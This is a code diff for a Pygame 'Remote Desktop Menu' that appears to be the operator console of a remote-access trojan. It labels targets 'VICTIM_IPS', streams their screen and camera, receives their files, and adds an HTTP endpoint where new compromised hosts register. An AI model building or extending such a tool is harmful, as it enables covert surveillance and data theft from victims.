@@ -9,8 +9,8 @@ import socket
 import argparse
 import sys
 import threading
-# import queue
-# from concurrent.futures import ThreadPoolExecutor
+import queue
+from concurrent.futures import ThreadPoolExecutor
 
 from ui.components.colors import *
 from ui.components.display import Display
@@ -18,8 +18,11 @@ from ui.components.button import Button
 from ui.components.input_box import InputBox
 from ui.handlers.screen_handler import screenreceiver
 from ui.handlers.camera_handler import camerareceiver
-from ui.handlers.file_handler import filereceiver
-# from ui.utils.network import R_tcp
+from ui.handlers.file_handler import receive_file
+from ui.utils.network import R_tcp
+from ui.utils.host_manager import HostManager
+from http.server import HTTPServer, BaseHTTPRequestHandler
+import json
 
 # Initialize Pygame
 pygame.init()
@@ -33,10 +36,46 @@ pygame.display.set_caption("Remote Desktop Menu")
 font = pygame.font.Font(None, 36)
 
 # Vector victim origin
-VICTIM_IPS = ['10.10.27.93', '192.168.1.6', '192.168.1.2']
+VICTIM_IPS = ['192.168.1.13']
 
 # Thread pool for background tasks
+thread_pool = ThreadPoolExecutor(max_workers=4)
 
+# Add to global variables
+host_manager = HostManager()
+
+class HostNotificationHandler(BaseHTTPRequestHandler):
+    def do_POST(self):
+        if self.path == '/new_host':
+            content_length = int(self.headers['Content-Length'])
+            post_data = self.rfile.read(content_length)
+            data = json.loads(post_data.decode('utf-8'))
+            
+            if 'new_host' in data:
+                host_manager.add_host(data['new_host'])
+                # Update the displays
+                update_displays()
+            
+            self.send_response(200)
+            self.end_headers()
+
+def start_notification_server():
+    server = HTTPServer(('0.0.0.0', 8080), HostNotificationHandler)
+    server.serve_forever()
+
+def update_displays():
+    global displays
+    hosts = host_manager.get_hosts()
+    
+    # Create new displays for new hosts
+    current_ips = [d.text for d in displays]
+    for host in hosts:
+        if host not in current_ips:
+            row = len(displays) // 3
+            col = len(displays) % 3
+            x = 50 + col * 250
+            y = 50 + row * 200
+            displays.append(Display(x, y, 200, 150, host, font))
 
 class UIState:
     def __init__(self):
@@ -66,8 +105,6 @@ def parseargs():
 # Create initial displays
 displays = [
     Display(50, 50, 200, 150, VICTIM_IPS[0], font),
-    Display(300, 50, 200, 150, VICTIM_IPS[1], font),
-    Display(550, 50, 200, 150, VICTIM_IPS[2], font),
 ]
 
 # Create buttons
@@ -117,7 +154,6 @@ def show_full_screen(display, options):
 
     screen_receiver = None
     camera_receiver = None
-    file_receiver = None
 
     clock = pygame.time.Clock()
 
@@ -126,6 +162,7 @@ def show_full_screen(display, options):
             if event.type == pygame.QUIT:
                 if screen_receiver:
                     screen_receiver.stop()
+                full_screen = False
                 return
             input_box.handle_event(event, options.port)
 
@@ -136,41 +173,27 @@ def show_full_screen(display, options):
                             screen_receiver.stop()
                         full_screen = False
                     elif camera_button.rect.collidepoint(event.pos):
-                        if camera_button.text == "Start Camera" and (ui_state.file_sending == False) and (ui_state.screen_running == False):
-                            ui_state.camera_running = True
+                        if camera_button.text == "Start Camera":
                             camera_button.text = "Stop Camera"
                             camera_receiver = camerareceiver(display.text, options.port + 2)
                         else:
                             camera_button.text = "Start Camera"
-                            ui_state.camera_running = False
                             if camera_receiver:
                                 camera_receiver.stop()
                                 camera_receiver = None
                     elif screen_button.rect.collidepoint(event.pos):
-                        if (screen_button.text == "Start Screen") and (ui_state.camera_running == False) and (ui_state.file_sending == False):
-                            ui_state.screen_running = True
+                        if screen_button.text == "Start Screen":
                             screen_button.text = "Stop Screen"
                             screen_receiver = screenreceiver(display.text, options.port + 1)
                         else:
                             screen_button.text = "Start Screen"
-                            ui_state.screen_running = False
                             if screen_receiver:
                                 screen_receiver.stop()
                                 screen_receiver = None
                     elif file_button.rect.collidepoint(event.pos):
-                        if file_button.text == "Receive File" and (ui_state.camera_running == False) and (ui_state.screen_running == False):
+                        if file_button.text == "Receive File":
                             file_button.text = "Receiving..."
-                            ui_state.file_sending = True
-                            def on_transfer_complete():
-                                file_button.text = "Receive File"
-                                ui_state.file_sending = False
-                            file_receiver = filereceiver("0.0.0.0", options.port + 3, on_transfer_complete)
-                        else:
-                            file_button.text = "Receive File"
-                            ui_state.file_sending = False
-                            if file_receiver:
-                                file_receiver.stop()
-                                file_receiver = None
+                            thread_pool.submit(lambda: receive_file("0.0.0.0", options.port + 3))
 
         try:
             screen.fill(WHITE)
@@ -185,19 +208,16 @@ def show_full_screen(display, options):
 
             # Cập nhật nội dung bên trong khung
             if screen_receiver and screen_receiver.double_buffer:
+                text_surface = font.render("",True,BLACK)
                 screen.blit(screen_receiver.double_buffer, frame_rect)
-                text_surface = font.render("", True, BLACK)
             else:
                 screen.blit(text_surface, text_rect)
-            
             if camera_receiver and camera_receiver.double_buffer:
-                # Tạo Surface từ buffer camera_receiver
                 text_surface = font.render("", True, BLACK)
                 screen.blit(camera_receiver.double_buffer, frame_rect)
             else:
                 screen.blit(text_surface, text_rect)
 
-            
             camera_button.draw(screen)
             screen_button.draw(screen)
             file_button.draw(screen)
@@ -218,9 +238,27 @@ def main():
     global options
     options = parseargs()
 
+    # Start notification server
+    notification_thread = threading.Thread(target=start_notification_server, daemon=True)
+    notification_thread.start()
+
+    # Initialize displays with saved hosts
+    saved_hosts = host_manager.get_hosts()
+    for host in saved_hosts:
+        if host not in VICTIM_IPS:
+            VICTIM_IPS.append(host)
+            row = len(displays) // 3
+            col = len(displays) % 3
+            x = 50 + col * 250
+            y = 50 + row * 200
+            displays.append(Display(x, y, 200, 150, host, font))
+
     # Start status checker thread
     status_thread = threading.Thread(target=status_checker_thread, args=(options,), daemon=True)
     status_thread.start()
+
+    clock = pygame.time.Clock()
+
     while ui_state.running:
         for event in pygame.event.get():
             if event.type == pygame.QUIT:
@@ -260,6 +298,7 @@ def main():
         pygame.display.flip()
 
     # Cleanup
+    thread_pool.shutdown(wait=False)
     pygame.quit()
 
 
